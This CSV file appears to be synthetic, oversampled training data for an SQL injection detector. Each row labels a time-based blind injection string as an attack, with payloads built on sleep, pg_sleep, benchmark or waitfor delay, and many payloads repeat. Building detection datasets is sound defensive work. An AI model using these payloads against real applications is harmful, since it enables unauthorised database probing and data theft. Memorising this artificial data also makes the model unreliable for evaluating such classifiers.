id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001875,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.4774418001088388
SMOTE_001876,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000038,0.9610236067472071
SMOTE_001877,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,1.7922620269550094
SMOTE_001878,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000010,1.0520046280394426
SMOTE_001879,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,0.8186949020318143
SMOTE_001880,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,1.3464152463306387
SMOTE_001881,attack,time,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.2099166449178345
SMOTE_001882,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,0.6031546050921159
SMOTE_001883,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000002,1.5731309175530472
SMOTE_001884,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,0.36405517869122034
SMOTE_001885,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,1.559970484417351
SMOTE_001886,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,2.1199645140094905
SMOTE_001887,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,1.2689561094931234
SMOTE_001888,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,0.6211960791101918
SMOTE_001889,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,1.0584628633113171
SMOTE_001890,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,1.4403284283439868
SMOTE_001891,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000050,1.1488526816636178
SMOTE_001892,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,0.482943048289713
SMOTE_001893,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000006,0.33408216930116486
SMOTE_001894,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000049,1.781947331760053
SMOTE_001895,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,0.7387089954941363
SMOTE_001896,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,1.3288889527068675
SMOTE_001897,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000047,1.1338822076403503
SMOTE_001898,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,0.6274862286236295
SMOTE_001899,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,0.7947899056644184
SMOTE_001900,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,1.3631214587785265
SMOTE_001901,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000048,3.1172399116577387
SMOTE_001902,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.528930473103717
SMOTE_001903,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,0.2781361381462971
SMOTE_001904,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,1.719286272214857
SMOTE_001905,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000034,2.169438309381919
SMOTE_001906,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,1.4575565085012456
SMOTE_001907,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,0.387973407211312
SMOTE_001908,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,0.5828323348263472
SMOTE_001909,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,0.32163364321131177
SMOTE_001910,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,0.6967971036164446
SMOTE_001911,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,0.09810728539556864
SMOTE_001912,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000011,0.13825275056918246
SMOTE_001913,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,1.7541051691000662
SMOTE_001914,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,0.12591249188848824
SMOTE_001915,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000048,1.1363175110554138
SMOTE_001916,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,0.9953106784483203
SMOTE_001917,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000067,2.3437503581966923
SMOTE_001918,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,1.223344312695412
SMOTE_001919,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,2.654615228599535
SMOTE_001920,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,1.8455464601546652
SMOTE_001921,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000048,2.999829615101426
SMOTE_001922,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000050,0.4993597806592766
SMOTE_001923,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000067,0.8799582975718165
SMOTE_001924,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,1.7028085951881393
SMOTE_001925,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000064,1.3874607007050697
SMOTE_001926,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,2.2494841477864846
SMOTE_001927,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000003,1.3299050983628435
SMOTE_001928,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000010,1.1919911367996219
SMOTE_001929,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,1.7979021371161097
SMOTE_001930,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,2.157817354091666
SMOTE_001931,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,1.5100611239689203
SMOTE_001932,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,1.1176248323653777
SMOTE_001933,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,1.8520356363545585
SMOTE_001934,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000011,0.47141184765021776
SMOTE_001935,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000054,1.5410830872908279
SMOTE_001936,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,0.5714742146685836
SMOTE_001937,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.5305310975879736
SMOTE_001938,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000046,0.7537491762442172
SMOTE_001939,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000002,1.2384565008699913
SMOTE_001940,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000017,1.4027172112880155
SMOTE_001941,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,0.6132506670507781
SMOTE_001942,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,0.12756004342410238
SMOTE_001943,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000030,1.6102198195454407
SMOTE_001944,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.48726626215306995
SMOTE_001945,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,1.8585928413413328
SMOTE_001946,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,1.6437083926152933
SMOTE_001947,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,0.38576621849933557
SMOTE_001948,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000049,0.37942986961355224
SMOTE_001949,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,0.17401567029585222
SMOTE_001950,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,2.0363643399938978
SMOTE_001951,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,1.0733100050549143
SMOTE_001952,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000036,0.17032395811652884
SMOTE_001953,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.9293115171954136
SMOTE_001954,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,1.3234533224879883
SMOTE_001955,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,0.385775414980421
SMOTE_001956,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000020,1.266507951601251
SMOTE_001957,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,1.0611184189563132
SMOTE_001958,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,0.15369229299174147
SMOTE_001959,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,0.5746699119909013
SMOTE_001960,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000036,0.14549543323543873
SMOTE_001961,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.5602111164574648
SMOTE_001962,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,0.9065191826338777
SMOTE_001963,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,0.8604914478553484
SMOTE_001964,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,0.7800246978925359
SMOTE_001965,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,1.4845792082565135
SMOTE_001966,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000046,1.140526465204053
SMOTE_001967,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,0.5644829739351253
SMOTE_001968,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,0.10997791326149817
SMOTE_001969,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,0.6636519710460992
SMOTE_001970,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,0.2359188620138291
SMOTE_001971,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000041,0.3356127363999131
SMOTE_001972,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,2.727880217925593
SMOTE_001973,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,1.8190782098742013
SMOTE_001974,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000046,0.42545478139322584
SMOTE_001975,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000011,2.298385430780118
SMOTE_001976,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.0
SMOTE_001977,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000030,0.21491880647083145
SMOTE_001978,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,1.8083180194099722
SMOTE_001979,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000015,1.2061414614595791
SMOTE_001980,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,1.1443454029118316
SMOTE_001981,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.1049421920664533
SMOTE_001982,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,0.8489312228463123
SMOTE_001983,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,1.3304429164825247
SMOTE_001984,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000062,0.16922260500914216
SMOTE_001985,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000041,0.3484571162744357
SMOTE_001986,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,2.299410592524177
SMOTE_001987,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,1.1159865834175908
SMOTE_001988,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,1.565006015948882
SMOTE_001989,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000054,1.3394287617875387
SMOTE_001990,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000019,1.167732288270137
SMOTE_001991,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000022,1.5604363430484618
SMOTE_001992,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000055,0.8046172923952086
SMOTE_001993,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000042,0.8137366326663835
